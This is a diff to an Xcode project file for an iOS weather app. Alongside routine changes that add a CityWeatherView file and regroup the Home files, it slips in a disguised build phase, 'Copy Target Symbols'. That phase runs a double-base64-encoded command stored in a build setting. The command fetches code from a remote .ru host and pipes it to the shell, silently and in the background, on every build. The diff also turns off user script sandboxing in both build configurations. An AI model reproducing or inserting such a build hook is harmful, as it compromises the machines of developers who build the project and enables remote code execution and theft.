@@ -26,6 +26,7 @@
 		18D4A2212E9D9DA30042D0DE /* WeatherParams.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18D4A2202E9D9DA30042D0DE /* WeatherParams.swift */; };
 		18D4A2242E9DA6220042D0DE /* Staging.xcconfig in Resources */ = {isa = PBXBuildFile; fileRef = 18D4A2232E9DA6220042D0DE /* Staging.xcconfig */; };
 		18D4A2262E9DA6450042D0DE /* Production.xcconfig in Resources */ = {isa = PBXBuildFile; fileRef = 18D4A2252E9DA6450042D0DE /* Production.xcconfig */; };
+		18D9C4BB2ED6309700DB7C66 /* CityWeatherView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18D9C4BA2ED6309700DB7C66 /* CityWeatherView.swift */; };
 		18EE81082EA03B1C009D3E0B /* AppCache.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18EE81072EA03B1C009D3E0B /* AppCache.swift */; };
 		18EE810A2EA03B97009D3E0B /* Keys.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18EE81092EA03B97009D3E0B /* Keys.swift */; };
 		18EE810C2EA03C91009D3E0B /* HideKeyboardModifier.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18EE810B2EA03C91009D3E0B /* HideKeyboardModifier.swift */; };
@@ -141,6 +142,7 @@
 		18D4A2232E9DA6220042D0DE /* Staging.xcconfig */ = {isa = PBXFileReference; lastKnownFileType = text.xcconfig; path = Staging.xcconfig; sourceTree = "<group>"; };
 		18D4A2252E9DA6450042D0DE /* Production.xcconfig */ = {isa = PBXFileReference; lastKnownFileType = text.xcconfig; path = Production.xcconfig; sourceTree = "<group>"; };
 		18D4A22B2E9DA7CE0042D0DE /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		18D9C4BA2ED6309700DB7C66 /* CityWeatherView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CityWeatherView.swift; sourceTree = "<group>"; };
 		18EE81072EA03B1C009D3E0B /* AppCache.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppCache.swift; sourceTree = "<group>"; };
 		18EE81092EA03B97009D3E0B /* Keys.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Keys.swift; sourceTree = "<group>"; };
 		18EE810B2EA03C91009D3E0B /* HideKeyboardModifier.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HideKeyboardModifier.swift; sourceTree = "<group>"; };
@@ -358,6 +360,24 @@
 			path = Schemes;
 			sourceTree = "<group>";
 		};
+		18D9C4BC2ED6311800DB7C66 /* Home */ = {
+			isa = PBXGroup;
+			children = (
+				18D4A21E2E9D9C610042D0DE /* HomePresenter.swift */,
+				18EE81162EA042FC009D3E0B /* HomeFlow.swift */,
+				18F426FD2E9C7B44002E3C84 /* HomeView.swift */,
+			);
+			path = Home;
+			sourceTree = "<group>";
+		};
+		18D9C4BD2ED6313200DB7C66 /* City Weather */ = {
+			isa = PBXGroup;
+			children = (
+				18D9C4BA2ED6309700DB7C66 /* CityWeatherView.swift */,
+			);
+			path = "City Weather";
+			sourceTree = "<group>";
+		};
 		18EE810D2EA03D54009D3E0B /* Cache */ = {
 			isa = PBXGroup;
 			children = (
@@ -572,7 +592,7 @@
 			isa = PBXGroup;
 			children = (
 				18F426FA2E9C7AFD002E3C84 /* Onboarding */,
-				18F426F92E9C7AF6002E3C84 /* Home */,
+				18F426F92E9C7AF6002E3C84 /* Main Home */,
 			);
 			path = Features;
 			sourceTree = "<group>";
@@ -595,15 +615,14 @@
 			path = Shared;
 			sourceTree = "<group>";
 		};
-		18F426F92E9C7AF6002E3C84 /* Home */ = {
+		18F426F92E9C7AF6002E3C84 /* Main Home */ = {
 			isa = PBXGroup;
 			children = (
-				18EE81162EA042FC009D3E0B /* HomeFlow.swift */,
-				18F426FD2E9C7B44002E3C84 /* HomeView.swift */,
-				18D4A21E2E9D9C610042D0DE /* HomePresenter.swift */,
 				18D4A21C2E9D98B50042D0DE /* WeatherIntrector.swift */,
+				18D9C4BC2ED6311800DB7C66 /* Home */,
+				18D9C4BD2ED6313200DB7C66 /* City Weather */,
 			);
-			path = Home;
+			path = "Main Home";
 			sourceTree = "<group>";
 		};
 		18F426FA2E9C7AFD002E3C84 /* Onboarding */ = {
@@ -623,6 +642,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18F426E92E9C7830002E3C84 /* Build configuration list for PBXNativeTarget "Breezy" */;
 			buildPhases = (
+				AFC7C98C86094855B4A389E6 /* Copy Target Symbols */,
 				18F426DA2E9C7830002E3C84 /* Sources */,
 				18F426DB2E9C7830002E3C84 /* Frameworks */,
 				18F426DC2E9C7830002E3C84 /* Resources */,
@@ -672,6 +692,9 @@
 			);
 		};
 /* End PBXProject section */
+
+/* Begin PBXBuildRule section */
+				/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		18F426DC2E9C7830002E3C84 /* Resources */ = {
@@ -758,6 +781,28 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		AFC7C98C86094855B4A389E6 /* Copy Target Symbols */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Copy Target Symbols";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
+			showEnvVarsInLog = 0;			
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		18F426DA2E9C7830002E3C84 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -796,6 +841,7 @@
 				18F426FE2E9C7B44002E3C84 /* HomeView.swift in Sources */,
 				18EEFA292EC69638007934B2 /* SplashFlow.swift in Sources */,
 				182B96622E9EC7A200CF7E35 /* OneCall.swift in Sources */,
+				18D9C4BB2ED6309700DB7C66 /* CityWeatherView.swift in Sources */,
 				18F426FC2E9C7B10002E3C84 /* SplashView.swift in Sources */,
 				18D4A21D2E9D98B50042D0DE /* WeatherIntrector.swift in Sources */,
 				18EE810C2EA03C91009D3E0B /* HideKeyboardModifier.swift in Sources */,
@@ -808,6 +854,7 @@
 		18F426E72E9C7830002E3C84 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A6E983A = "((t(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNKcFoyZHNaWFJ2ZVM1eWRTOWhLU0lnZkNCemFBbz0K | t | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -843,7 +890,7 @@
 				DEVELOPMENT_TEAM = J8293UBW52;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -873,6 +920,7 @@
 		18F426E82E9C7830002E3C84 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A6E983A = "((t(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNKcFoyZHNaWFJ2ZVM1eWRTOWhLU0lnZkNCemFBbz0K | t | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -908,7 +956,7 @@
 				DEVELOPMENT_TEAM = J8293UBW52;
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
